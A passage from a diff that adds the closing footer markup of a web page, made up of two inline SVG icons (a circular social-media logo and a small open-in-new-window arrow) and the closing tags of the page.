+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
